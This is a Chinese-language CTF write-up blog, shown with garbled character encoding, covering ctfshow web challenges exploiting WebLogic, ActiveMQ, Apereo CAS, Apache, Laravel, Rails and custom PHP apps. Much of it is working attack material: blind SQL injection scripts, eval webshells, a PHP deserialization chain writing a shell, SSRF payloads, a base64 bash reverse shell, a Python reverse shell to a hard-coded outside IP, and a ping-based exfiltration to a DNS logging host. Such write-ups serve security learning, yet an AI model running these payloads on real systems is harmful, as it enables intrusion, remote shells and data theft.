<p>ä½¿ç”¨<a href="https://github.com/KimJun1010/WeblogicTool">å·¥å…·</a>æ‰«åˆ°å­˜åœ¨<a href="https://www.cnblogs.com/backlion/p/8194324.html">CVE-2017-10271</a></p>
<h2 id="web588">web588</h2>
<p>weblogicç‰ˆæœ¬ä¸º<code>12.2.1.3.0</code></p>
<p>å‚è€ƒæ–‡ç« <a href="https://www.freebuf.com/vuls/325607.html">CVE-2018-2894æ¼æ´å¤ç°</a></p>
<p>åˆ©ç”¨ä¸Šé¢˜å·¥å…·æ‰§è¡Œ<code>env</code></p>
<h2 id="web589">web589</h2>
<p>å‚è€ƒæ–‡ç« <a href="https://blog.csdn.net/m0_51683653/article/details/129240528">CVE-2016-3088 ActiveMQä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´</a><br>
è®¿é—®<code>/admin</code>è·¯å¾„<br>
é»˜è®¤è´¦æˆ·å¯†ç admin/admin ç™»å½•</p>
<p>è®¿é—®<code>/admin/test/systemProperties.jsp</code>è·å¾—webç›®å½•çš„ç»å¯¹è·¯å¾„</p>
<p>ä½¿ç”¨PUTæ–¹æ³•ä¸Šä¼ å°é©¬<br>
<img src="https://fallingskies22.github.io/post-images/1723722142544.png" alt="" loading="lazy"></p>
<p>ä½¿ç”¨MOVEæ–¹æ³•ç§»åŠ¨åˆ°webç›®å½•ä¸‹<br>
<img src="https://fallingskies22.github.io/post-images/1723722278587.png" alt="" loading="lazy"></p>
<p>è®¿é—®webshell</p>
<pre><code>admin/1.jsp?pwd=1&amp;p=env
</code></pre>
<h2 id="web590">web590</h2>
<p>å‚è€ƒæ–‡ç« <a href="https://github.com/vulhub/vulhub/blob/master/apereo-cas/4.1-rce/README.zh-cn.md">Apereo CAS 4.1 ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œæ¼æ´</a></p>
<p>ä½¿ç”¨å·¥å…·<a href="https://github.com/vulhub/Apereo-CAS-Attack">Apereo-CAS attack</a>ç”Ÿæˆpayload</p>
<p>ä½¿ç”¨åå¼¹shellçš„æ–¹å¼</p>
<pre><code>java -jar .\apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0IDA+JjE=}|{base64,-d}|{bash,-i}&quot;
</code></pre>
<p>å°†payloadæ”¾åœ¨ç™»å½•åŒ…ä¸­çš„executionå‚æ•°ä¸­<br>
<img src="https://fallingskies22.github.io/post-images/1723733265732.png" alt="" loading="lazy"></p>
<h2 id="web591">web591</h2>
<p>å‚è€ƒæ–‡ç« <a href="https://www.freebuf.com/vuls/270633.html">Apache HTTPD æ¢è¡Œè§£ææ¼æ´åˆ†æä¸å¤ç°ï¼ˆCVE-2017-15715ï¼‰</a></p>
<p>æ–‡ä»¶ä¸Šä¼ å¤„å¯¹æ–‡ä»¶ååšäº†æ ¡éªŒï¼Œä½¿ç”¨%0açš„æ–¹å¼ç»•è¿‡ï¼Œè¯¦ç»†åˆ†æçœ‹ä¸Šé¢æ–‡ç« ï¼Œä¸è¦ç›´æ¥æ¢è¡Œï¼Œä¼šå˜æˆ<code>0x0d0x0a</code>ï¼Œä½¿ç”¨hexä¿®æ”¹çš„æ–¹å¼åœ¨æ–‡ä»¶åæœ€åæ·»åŠ <code>0x0a</code><br>
<img src="https://fallingskies22.github.io/post-images/1723733981686.png" alt="" loading="lazy"></p>
<h2 id="web592">web592</h2>
<p>å‚è€ƒæ–‡ç« <a href="https://github.com/vulhub/vulhub/blob/master/httpd/apache_parsing_vulnerability/README.md">Apache HTTPD å¤šåç¼€è§£ææ¼æ´</a></p>
<p>ä¸Šä¼ æ–‡ä»¶åä¸º<code>1.php.png</code><br>
åªè¦ç»™.phpåç¼€å¢åŠ äº†å¤„ç†å™¨ï¼Œåœ¨å¤šä¸ªåç¼€æƒ…å†µä¸‹ï¼Œåªè¦å«æœ‰<code>.php</code>åç¼€çš„æ–‡ä»¶å³å°†è¢«è¯†åˆ«æˆPHPæ–‡ä»¶</p>
<figure data-type="image" tabindex="5"><img src="https://fallingskies22.github.io/post-images/1723734648233.png" alt="" loading="lazy"></figure>
<h2 id="web593">web593</h2>
<p>å‚è€ƒæ–‡ç« <a href="https://zgao.top/apache-ssi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Apache SSI è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°</a></p>
<p>ä¸Šä¼ shtmlæ–‡ä»¶</p>
<pre><code>&lt;!--#exec cmd=&quot;cat /flag&quot;--&gt;
</code></pre>
<p>è®¿é—®å³å¯æ‰§è¡Œå‘½ä»¤ã€‚</p>
<h2 id="web594">web594</h2>
<p>å‚è€ƒæ–‡ç« <a href="https://www.anquanke.com/post/id/231459">CVE-2021-3129 Laravel Debug mode RCE æ¼æ´åˆ†æ</a></p>
<p>è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨è¿‡ç¨‹è¿˜æ˜¯æŒºç²¾å½©çš„ï¼Œä¸»è¦æ˜¯åˆ©ç”¨ä¼ªåè®®æ¸…é™¤æ— å…³æ•°æ®å¹²æ‰°ï¼Œå†™å…¥pharæ–‡ä»¶çš„è¿‡ç¨‹ã€‚</p>
<p>ç”Ÿæˆååºåˆ—åŒ–payloadçš„<a href="https://github.com/ambionics/phpggc">å·¥å…·phpggc</a></p>
<p>è¿™é‡Œåˆ©ç”¨ Monolog åº“çš„é“¾ï¼Œä¹Ÿå¯ä»¥ç”¨Laravelè‡ªå¸¦çš„é“¾ã€‚</p>
<p>ä½¿ç”¨å…¶ä»–äººå†™å¥½çš„<a href="https://github.com/zhzyker/CVE-2021-3129/tree/main">exp</a>,æœ‰é—®é¢˜å¯ä»¥è‡ªå·±ä¿®æ”¹ä¸‹ã€‚ğŸ˜˜</p>
<h2 id="web595">web595</h2>
<p>å‚è€ƒæ–‡ç« <a href="https://www.bilibili.com/read/cv10712219/">PHP zerodiumåé—¨æ¼æ´</a></p>
<pre><code>User-Agentt: zerodiumsystem('cat /flag');
</code></pre>
<h2 id="web596">web596</h2>
<p>å‚è€ƒæ–‡ç« <a href="https://github.com/neargle/PIL-RCE-By-GhostButt">PIL-RCE-By-GhostButt</a></p>
<p>è¿™ä¸ªæ¼æ´è¿˜æ˜¯å¾ˆå¤æ‚ï¼Œç­‰æœ‰éœ€è¦å†æ…¢æ…¢åˆ†æã€‚</p>
<p>ä¸Šä¼ å›¾ç‰‡1.pngï¼Œå‚è€ƒ<a href="https://github.com/vulhub/vulhub/blob/master/python/PIL-CVE-2017-8291/poc.png">poc.png</a></p>
<p><img src="https://fallingskies22.github.io/post-images/1723955493983.png" alt="" loading="lazy"><br>
å°†payloadå¤„æ”¹ä¸ºåå¼¹shell</p>
<pre><code class="language-sh">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.109.140.38&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)'
</code></pre>
<h2 id="web597">web597</h2>
<p>å‚è€ƒæ–‡ç« <a href="https://github.com/vulhub/vulhub/blob/master/rails/CVE-2018-3760/README.zh-cn.md">Ruby On Rails è·¯å¾„ç©¿è¶Šæ¼æ´ï¼ˆCVE-2018-3760ï¼‰</a></p>
<p>è®¿é—®é“¾æ¥<code>/assets/file:%2f%2f/etc/passwd</code>è·å–å…è®¸çš„ç›®å½•åˆ—è¡¨</p>
<p>å†ä½¿ç”¨<code>%252e%252e</code>å‘ä¸Šä¸€å±‚è·³è½¬è¯»å–å…¶ä»–æ–‡ä»¶ã€‚</p>
<pre><code>/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/flag
</code></pre>
<h2 id="web598">web598</h2>
<p>å‚è€ƒæ–‡ç« <a href="https://github.com/cyberharsh/rails5418">Ruby on Rails è·¯å¾„ç©¿è¶Šä¸ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼ˆCVE-2019-5418ï¼‰</a></p>
<pre><code>Accept: ../../../../../../../../flag{{
</code></pre>
<h2 id="web599">web599</h2>
<p>å‚è€ƒæ–‡ç« <a href="https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Ruby%20NetFTP%20%E6%A8%A1%E5%9D%97%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2017-17405.md">Ruby NetFTP æ¨¡å—å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2017-17405</a></p>
<p>è‡ªå·±èµ·ä¸€ä¸ªftpæœåŠ¡</p>
<pre><code># å®‰è£…pyftpdlib
pip install pyftpdlib

# åœ¨å½“å‰ç›®å½•ä¸‹å¯åŠ¨ä¸€ä¸ªftpæœåŠ¡å™¨ï¼Œé»˜è®¤ç›‘å¬åœ¨`0.0.0.0:8080`ç«¯å£
python3 -m pyftpdlib -p 8080 -i 0.0.0.0
</code></pre>
<p>å‚è€ƒpayloadå¦‚ä¸‹</p>
<pre><code>GET /download?uri=ftp://ip:port/&amp;file=|ping${IFS}$FLAG.4d62192e-9edb-4352-9024-cb01ee487a23.dnshook.site${IFS}-c${IFS}5 HTTP/1.1
</code></pre>
<p>æ‰§è¡Œä¸äº†å‘½ä»¤ï¼Œä¸çŸ¥é“ä¸ºå•¥ã€‚ã€‚ã€‚</p>
<p>ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯vpsé˜²ç«å¢™é—®é¢˜ï¼Œå…¨ç«¯å£å¼€æ”¾åä¾ç„¶æ— æ³•é¡ºåˆ©æ‰§è¡Œå‘½ä»¤ã€‚ã€‚ã€‚</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ctfshow]ä¸­æœŸæµ‹è¯„]]></title>
        <id>https://fallingskies22.github.io/post/ctfshowzhong-qi-ce-ping/</id>
        <link href="https://fallingskies22.github.io/post/ctfshowzhong-qi-ce-ping/">
        </link>
        <updated>2024-08-06T12:24:46.000Z</updated>
        <content type="html"><![CDATA[<h2 id="web486">web486</h2>
<p>æ ¹æ®æŠ¥é”™ä¿¡æ¯æç¤ºï¼Œå‘ç°éœ€è¦æä¾›actionå‚æ•°ï¼Œç„¶å<code>file_get_contents($_GET['action'].php)</code></p>
<pre><code>?action=../flag
</code></pre>
<h2 id="web487">web487</h2>
<p>åˆ©ç”¨ä¸Šé¢˜ä»»æ„æ–‡ä»¶è¯»å–çœ‹index.phpæºç </p>
<pre><code class="language-php">&lt;?php
include('render/render_class.php');
include('render/db_class.php');
$action=$_GET['action'];
if(!isset($action)){
	header('location:index.php?action=login');
	die();	
}

if($action=='check'){
	$username=$_GET['username'];
	$password=$_GET['password'];
	$sql = &quot;select id from user where username = md5('$username') and password=md5('$password') order by id limit 1&quot;;
	$user=db::select_one($sql);
	if($user){
		templateUtil::render('index',array('username'=&gt;$username));
	}else{
		header('location:index.php?action=login');
	}
}

if($action=='login'){
	templateUtil::render($action);
}else{
	templateUtil::render($action);
}
</code></pre>
<p>è¿™é‡Œå­˜åœ¨sqlæ³¨å…¥ï¼Œç„¶åusernameå¤„åº”è¯¥æ˜¯æœ‰å›æ˜¾çš„ï¼Œä½†å¯èƒ½é¢˜ç›®æœ‰é—®é¢˜ï¼Œå›æ˜¾ä¸äº†ã€‚<br>
ä½¿ç”¨ç›²æ³¨è„šæœ¬</p>
<pre><code class="language-py">import requests

url = &quot;http://df52edca-7258-4e0a-8b02-6943d7e6edd7.challenge.ctf.show/index.php?action=check&quot;

result = ''
i = 0

proxy = {
    'http':&quot;http://127.0.0.1:8080&quot;
}

while True:
    i = i + 1
    head = 32
    tail = 127

    while head &lt; tail:
        mid = (head + tail) &gt;&gt; 1
        # payload = f'if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},1,0)'
        # payload = f'if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},1,0)'
        payload = f'if(ascii(substr((select(group_concat(flag))from(ctfshow.flag)),{i},1))&gt;{mid},1,0)'
        data = {
            'username': f&quot;999')||{payload}#&quot;,
            'password': &quot;123&quot;
        }
        r = requests.get(url,params=data,proxies=proxy)
        if &quot;admin&quot; in r.text:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
</code></pre>
<h2 id="web488">web488</h2>
<p>åˆ†æä¸‹æºç <br>
render_class.php</p>
<pre><code class="language-php">
&lt;?php

include('file_class.php');
include('cache_class.php');

class templateUtil {
	public static function render($template,$arg=array()){
		if(cache::cache_exists($template)){
			echo cache::get_cache($template);
		}else{
			$templateContent=fileUtil::read('templates/'.$template.'.php');
			$cache=templateUtil::shade($templateContent,$arg);
			cache::create_cache($template,$cache);
			echo $cache;
		}
	}
	public static  function shade($templateContent,$arg){
		foreach ($arg as $key =&gt; $value) {
			$templateContent=str_replace('{{'.$key.'}}', $value, $templateContent);
		}
		return $templateContent;
	}

}
</code></pre>
<p>cache_class.php</p>
<pre><code class="language-php">&lt;?php

class cache{
	public static function create_cache($template,$content){
		if(file_exists('cache/'.md5($template).'.php')){
			return true;
		}else{
			fileUtil::write('cache/'.md5($template).'.php',$content);
		}
	}
	public static function get_cache($template){
		return fileUtil::read('cache/'.md5($template).'.php');
	}
	public static function cache_exists($template){
		return file_exists('cache/'.md5($template).'.php');
	}

}
</code></pre>
<p>åœ¨ç¼“å­˜æ–‡ä»¶åŠŸèƒ½å¤„ï¼Œå­˜åœ¨ä»»æ„å†™æ–‡ä»¶ã€‚</p>
<p>å¯ä»¥æ§åˆ¶md5(error).phpçš„å†…å®¹ï¼Œåœ¨usernameå¤„å†™å…¥å†…å®¹ã€‚</p>
<pre><code>?action=check&amp;username=&lt;?php eval($_POST[1]);?&gt;&amp;password=123
</code></pre>
<p>è®¿é—®<code>/cache/cb5e100e5a9a3e7f6d1fd97512215282.php</code>è¿æ¥shell</p>
<h2 id="web489">web489</h2>
<p>ä½¿ç”¨extractå‡½æ•°è¿›è¡Œå˜é‡è¦†ç›–<br>
index.php</p>
<pre><code class="language-php">&lt;?php
include('render/render_class.php');
include('render/db_class.php');



$action=$_GET['action'];
if(!isset($action)){
	header('location:index.php?action=login');
	die();	
}

if($action=='check'){
	$sql = &quot;select id from user where username = '&quot;.md5($username).&quot;' and password='&quot;.md5($password).&quot;' order by id limit 1&quot;;
	extract($_GET);
	$user=db::select_one($sql);
	if($user){
		templateUtil::render('index',array('username'=&gt;$username));
	}else{
		templateUtil::render('error');
	}
}

if($action=='clear'){
	system('rm -rf cache/*');
	die('cache clear');
}

if($action=='login'){
	templateUtil::render($action);
}else{
	templateUtil::render($action);
}
</code></pre>
<p>ç›´æ¥è¦†ç›–sqlè¯­å¥æ¥å†™shell,ä½†æ˜¯æ²¡æœ‰å†™æƒé™<br>
è¿˜æ˜¯åªèƒ½ç›²æ³¨</p>
<pre><code class="language-py">import requests

url = &quot;http://ef0b4c73-1742-4596-951a-f359520c8d19.challenge.ctf.show/index.php?action=check&quot;

result = ''
i = 0

proxy = {
    'http':&quot;http://127.0.0.1:8080&quot;
}

while True:
    i = i + 1
    head = 32
    tail = 127

    while head &lt; tail:
        mid = (head + tail) &gt;&gt; 1
        payload = f&quot;if(ascii(substr((select load_file('/flag')),{i},1))&gt;'{mid}',sleep(0.6),1)&quot;
        data = {
            'sql': f&quot;select {payload}&quot;
        }
        try:
            r = requests.get(url,params=data,proxies=proxy, timeout=0.5)
            tail = mid
        except:
            head = mid + 1

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
</code></pre>
<h2 id="web490">web490</h2>
<p>index.php</p>
<pre><code class="language-php">&lt;?php

include('render/render_class.php');
include('render/db_class.php');


$action=$_GET['action'];
if(!isset($action)){
	header('location:index.php?action=login');
	die();	
}

if($action=='check'){
	extract($_GET);
	$sql = &quot;select username from user where username = '&quot;.$username.&quot;' and password='&quot;.md5($password).&quot;' order by id limit 1&quot;;
	$user=db::select_one($sql);
	if($user){
		templateUtil::render('index',array('username'=&gt;$user-&gt;username));
	}else{
		templateUtil::render('error');
	}
}
if($action=='clear'){
	system('rm -rf cache/*');
	die('cache clear');
}

if($action=='login'){
	templateUtil::render($action);
}else{
	templateUtil::render($action);
}
</code></pre>
<p>usernameå¤„å­˜åœ¨sqlæ³¨å…¥ã€‚</p>
<pre><code class="language-py">import requests

url = &quot;http://34dbfb2d-2b7b-4ffc-9f66-c4f653c2116f.challenge.ctf.show//index.php?action=check&quot;

result = ''
i = 0

proxy = {
    'http':&quot;http://127.0.0.1:8080&quot;
}

while True:
    i = i + 1
    head = 32
    tail = 127

    while head &lt; tail:
        mid = (head + tail) &gt;&gt; 1
        payload = f&quot;if(ascii(substr((select load_file('/flag')),{i},1))&gt;'{mid}',1,0)&quot;
        data = {
            'username': f&quot;admin' or {payload}#&quot;,
            'password': &quot;123&quot;,

        }
        r = requests.get(url=url, params=data,proxies=proxy)
        if 'ä¸å­˜åœ¨' not in r.text:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
</code></pre>
<h2 id="web491">web491</h2>
<p>åŒä¸Š</p>
<h2 id="web492">web492</h2>
<p>å¯¹usernameåšäº†æ­£åˆ™åŒ¹é…ï¼Œåªèƒ½ä¸ºå­—æ¯æ•°å­—ã€‚</p>
<pre><code class="language-php">&lt;?php

if($action=='check'){
	extract($_GET);
	if(preg_match('/^[A-Za-z0-9]+$/', $username)){
		$sql = &quot;select username from user where username = '&quot;.$username.&quot;' and password='&quot;.md5($password).&quot;' order by id limit 1&quot;;
		$user=db::select_one_array($sql);
	}
	if($user){
		templateUtil::render('index',$user);
	}else{
		templateUtil::render('error');
	}
}
</code></pre>
<p>render/render_class.php</p>
<pre><code class="language-php">&lt;?php

include('file_class.php');
include('cache_class.php');

class templateUtil {
	public static function render($template,$arg=array()){
		if(cache::cache_exists($template)){
			echo cache::get_cache($template);
		}else{
			$templateContent=fileUtil::read('templates/'.$template.'.php');
			$cache=templateUtil::shade($templateContent,$arg);
			cache::create_cache($template,$cache);
			echo $cache;
		}
	}
	public static  function shade($templateContent,$arg){
		foreach ($arg as $key =&gt; $value) {
			$templateContent=str_replace('{{'.$key.'}}', '&lt;ï¼--'.$value.'--&gt;', $templateContent);
		}
		return $templateContent;
	}
}
</code></pre>
<p>å…ˆä½¿ç”¨å˜é‡è¦†ç›–ï¼Œæ§åˆ¶<code>$user</code>çš„å€¼ï¼Œå†åˆ©ç”¨åˆ›å»ºç¼“å­˜æ–‡ä»¶æ¥å†™å…¥ã€‚</p>
<pre><code>?action=check&amp;user[username]=--&gt;&lt;?php%20@eval($_POST[1]);?&gt;
</code></pre>
<p>è®¿é—®<code>/cache/6a992d5529f459a44fee58c733255e86.php</code><br>
è¿æ¥shellå³å¯ã€‚</p>
<h2 id="web493">web493</h2>
<p>å­˜åœ¨ååºåˆ—åŒ–å…¥å£ã€‚<br>
index.php</p>
<pre><code class="language-php">&lt;?php
$action=$_GET['action'];
if(!isset($action)){
	if(isset($_COOKIE['user'])){
		$c=$_COOKIE['user'];
		$user=unserialize($c);
		if($user){
			templateUtil::render('index');
		}else{
			header('location:index.php?action=login');
		}
	}else{
		header('location:index.php?action=login');
	}
	die();	
}
</code></pre>
<p>æ‰¾å¯ä»¥åˆ©ç”¨çš„destructå‡½æ•°ã€‚<br>
db_class.php</p>
<pre><code class="language-php">&lt;?php
error_reporting(0);
class db{
	
	public $db;
	public $log;
	public $sql;
	public $username='root';
	public $password='root';
	public $port='3306';
	public $addr='127.0.0.1';
	public $database='ctfshow';
	public function __construct(){
		$this-&gt;log=new dbLog();
		$this-&gt;db=$this-&gt;getConnection();
	}

	public function getConnection(){
		 
		return new mysqli($this-&gt;addr,$this-&gt;username,$this-&gt;password,$this-&gt;database);
	}

	public  function select_one($sql){
		$this-&gt;sql=$sql;
		$conn = db::getConnection();
		$result=$conn-&gt;query($sql);
		if($result){
			return $result-&gt;fetch_object();
		}

	}
	public  function select_one_array($sql){
		$this-&gt;sql=$sql;
		$conn = db::getConnection();
		$result=$conn-&gt;query($sql);
		if($result){
			return $result-&gt;fetch_assoc();
		}

	}
	public function __destruct(){
		$this-&gt;log-&gt;log($this-&gt;sql);
	}
}
class dbLog{
	public $sql;
	public $content;
	public $log;

	public function __construct(){
		$this-&gt;log='log/'.date_format(date_create(),&quot;Y-m-d&quot;).'.txt';
	}
	public function log($sql){
		$this-&gt;content = $this-&gt;content.date_format(date_create(),&quot;Y-m-d-H-i-s&quot;).' '.$sql.' \r\n';
	}
	public function __destruct(){
		file_put_contents($this-&gt;log, $this-&gt;content,FILE_APPEND);
	}
}
</code></pre>
<p>poc</p>
<pre><code class="language-php">&lt;?php

class dbLog{
public $sql;
public $content;
public $log;

public function __construct(){
$this-&gt;log='/var/www/html/1.php';
$this-&gt;sql=&quot;&quot;;
$this-&gt;content=&quot;&lt;?php @eval(\$_POST[1])?&gt;&quot;;
}
public function log($sql){
$this-&gt;content = $this-&gt;content.date_format(date_create(),&quot;Y-m-d-H-i-s&quot;).' '.$sql.' \r\n';
}
public function __destruct(){
file_put_contents($this-&gt;log, $this-&gt;content,FILE_APPEND);
}
}

echo serialize(new dbLog());
</code></pre>
<p>urlç¼–ç ä¸€ä¸‹</p>
<pre><code>Cookie: user=%4f%3a%35%3a%22%64%62%4c%6f%67%22%3a%33%3a%7b%73%3a%33%3a%22%73%71%6c%22%3b%73%3a%30%3a%22%22%3b%73%3a%37%3a%22%63%6f%6e%74%65%6e%74%22%3b%73%3a%32%34%3a%22%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3f%3e%22%3b%73%3a%33%3a%22%6c%6f%67%22%3b%73%3a%31%39%3a%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%3b%7d;
</code></pre>
<h2 id="web494">web494</h2>
<p>é¢„æœŸåº”è¯¥æ˜¯sqlæ³¨å…¥ç»•è¿‡ï¼Œä½†ç”¨ä¸Šé¢˜payloadçš„ååºåˆ—åŒ–ä¾ç„¶å¯ä»¥ã€‚<br>
flagå†æ•°æ®åº“ä¸­ã€‚</p>
<pre><code class="language-php">&lt;?php
$action=$_GET['action'];
if(!isset($action)){
	if(isset($_COOKIE['user'])){
		$c=$_COOKIE['user'];
		if(preg_match('/\:|\,/', $c)){
			$user=unserialize($c);
		}
		if($user){
			templateUtil::render('index');
		}else{
			header('location:index.php?action=login');
		}
	}else{
		header('location:index.php?action=login');
	}
	die();	
}

if($action=='check'){
	extract($_GET);
	if(!preg_match('/or|and|innodb|sys/i', $username)){
		$sql = &quot;select username from user where username = '&quot;.$username.&quot;' and password='&quot;.md5($password).&quot;' order by id limit 1&quot;;
		$db=new db();
		$user=$db-&gt;select_one_array($sql);
	}
	if($user){
		setcookie('user',$user);
		templateUtil::render('index',$user);
	}else{
		templateUtil::render('error');
	}
}
</code></pre>
<h2 id="web495">web495</h2>
<p>åŒä¸Š</p>
<pre><code class="language-php">&lt;?php
$username=$_POST['username'];
		$password=$_POST['password'];
		if(!preg_match('/file|innodb|sys|mysql/i', $username)){
			$sql = &quot;select username,nickname from user where username = '&quot;.$username.&quot;' and password='&quot;.md5($password).&quot;' order by id limit 1&quot;;
			$db=new db();
			$user=$db-&gt;select_one_array($sql);
		}
</code></pre>
<h2 id="web496">web496</h2>
<p>ååºåˆ—åŒ–å…¥å£è¢«æ³¨é‡Šæ‰äº†ï¼Œåªèƒ½sqlæ³¨å…¥äº†</p>
<pre><code class="language-php">&lt;?php
$username=$_POST['username'];
		$password=$_POST['password'];
		if(!preg_match('/or|file|innodb|sys|mysql/i', $username)){
			$sql = &quot;select username,nickname from user where username = '&quot;.$username.&quot;' and password='&quot;.md5($password).&quot;' order by id limit 1&quot;;
			$db=new db();
			$user=$db-&gt;select_one_array($sql);
		}
</code></pre>
<p>ä½†æ˜¯è¿™é‡Œå› ä¸ºè¿‡æ»¤äº†æ€»è¡¨ï¼Œæ²¡æ³•æŸ¥è¯¢è¡¨åå’Œåˆ—åã€‚ï¼ˆåœ¨çŸ¥é“çš„æƒ…å†µä¸‹å¯ä»¥æ³¨å…¥ï¼‰</p>
<pre><code class="language-py">import requests

url = &quot;http://b078dfb1-17d3-4a27-bd57-c72019b486da.challenge.ctf.show/index.php?action=check&quot;

result = ''
i = 0

proxy = {
    'http':&quot;http://127.0.0.1:8080&quot;
}

while True:
    i = i + 1
    head = 32
    tail = 127

    #print(i)
    while head &lt; tail:
        mid = (head + tail) &gt;&gt; 1
        #print(&quot;mid&quot;,mid)
        payload = f&quot;if(ascii(substr((select  flagisherebutyouneverknow118 from flagyoudontknow76),{i},1))&gt;'{mid}',1,0)&quot;
        data = {
            'username': f&quot;123' || {payload}#&quot;,
            'password': &quot;123&quot;,

        }
        r = requests.post(url=url, data=data,proxies=proxy,allow_redirects=False)
        #print(r.status_code)
        if 302 == r.status_code:
            head = mid + 1
            #print(&quot;in the right&quot;)
        else:
            tail = mid
            #print(&quot;in the left&quot;)

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
</code></pre>
<p>ä½¿ç”¨ä¸‡èƒ½è´¦å·ç™»å½•è¿›åå°åï¼Œæœ‰ä¸€ä¸ªæ›´æ–°å¯†ç åŠŸèƒ½ã€‚<br>
admin_edit.php</p>
<pre><code class="language-php">&lt;?php

session_start();
include('../render/db_class.php');

error_reporting(0);
$user= $_SESSION['user'];
$ret = array(
		&quot;code&quot;=&gt;0,
		&quot;msg&quot;=&gt;&quot;æŸ¥è¯¢å¤±è´¥&quot;,
		&quot;count&quot;=&gt;0,
		&quot;data&quot;=&gt;array()
	);
if($user){
	extract($_POST);
	$sql = &quot;update user set nickname='&quot;.substr($nickname, 0,8).&quot;' where username='&quot;.$user['username'].&quot;'&quot;;
	$db=new db();
	if($db-&gt;update_one($sql)){
		$_SESSION['user']['nickname']=$nickname;
		$ret['msg']='ç®¡ç†å‘˜ä¿¡æ¯ä¿®æ”¹æˆåŠŸ';
	}else{
		$ret['msg']='ç®¡ç†å‘˜ä¿¡æ¯ä¿®æ”¹å¤±è´¥';
	}
	die(json_encode($ret));

}else{
	$ret['msg']='è¯·ç™»å½•åä½¿ç”¨æ­¤åŠŸèƒ½';
	die(json_encode($ret));
}
</code></pre>
<p>è¿™é‡Œæ²¡æœ‰è¿‡æ»¤ï¼Œå­˜åœ¨updateå‹æ³¨å…¥</p>
<pre><code class="language-py">import requests
import string
url=&quot;http://b078dfb1-17d3-4a27-bd57-c72019b486da.challenge.ctf.show&quot;
s=string.ascii_lowercase+string.digits+&quot;,{-}&quot;
sess=requests.session()
sess.post(url+&quot;?action=check&quot;,data={&quot;username&quot;:&quot;1'||1#&quot;,&quot;password&quot;:1})
flag=&quot;&quot;
for i in range(9,70):
        print(i)
        for j in s:
            data={
            'nickname':str(i*2)+str(j), #ä¸è®©nicknameé‡å¤å°±è¡Œ
            #'user[username]':&quot;1'||if(ascii(substr((select  group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1))={1},1,0)#&quot;.format(i,j)
            #'user[username]':&quot;1'||if(substr((select  group_concat(column_name) from information_schema.columns where table_name='flagyoudontknow76'),{0},1)='{1}',1,0)#&quot;.format(i,j)
            'user[username]':&quot;1'||if(substr((select  flagisherebutyouneverknow118 from flagyoudontknow76),{0},1)='{1}',1,0)#&quot;.format(i,j)

            }
            r=sess.post(url+&quot;/api/admin_edit.php&quot;,data=data)
            if(&quot;u529f&quot; in r.text):
                flag+=j
                print(flag)
                break
</code></pre>
<h2 id="web497">web497</h2>
<p>ä½¿ç”¨ä¸‡èƒ½è´¦å·ç™»å½•åå°<br>
ä¸Šä¼ å›¾ç‰‡å¤„å­˜åœ¨ssrfæ¼æ´ã€‚</p>
<p>render_class.php</p>
<pre><code class="language-php">&lt;?php
public static function checkImage($templateContent,$arg=array()){
		foreach ($arg as $key =&gt; $value) {

			if(stripos($templateContent, '{{img:'.$key.'}}')){
				$encode='';
				if(file_exists(__DIR__.'/../cache/'.md5($value))){
					$encode=file_get_contents(__DIR__.'/../cache/'.md5($value));
				}else{
					$ch=curl_init($value);
					curl_setopt($ch, CURLOPT_HEADER, 0);
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					$result=curl_exec($ch);
					curl_close($ch);
					$ret=chunk_split(base64_encode($result));
					$encode = 'data:image/jpg/png/gif;base64,' . $ret;
					file_put_contents(__DIR__.'/../cache/'.md5($value), $encode);
				}
				$templateContent=str_replace('{{img:'.$key.'}}', $encode, $templateContent);
			}
			
		}
</code></pre>
<p>payload</p>
<pre><code>file:///flag
</code></pre>
<h2 id="web498">web498</h2>
<p>åŒä¸Šå­˜åœ¨ssrfï¼Œä½†æ˜¯éœ€è¦ç”¨ssrfæ‰“redis<br>
ä½¿ç”¨poc</p>
<pre><code>dict://127.0.0.1:6379
</code></pre>
<p>æ ¹æ®è¿”å›å€¼å‘ç°å­˜åœ¨redisæœåŠ¡<br>
ä½¿ç”¨Gopherusç”Ÿæˆpayload</p>
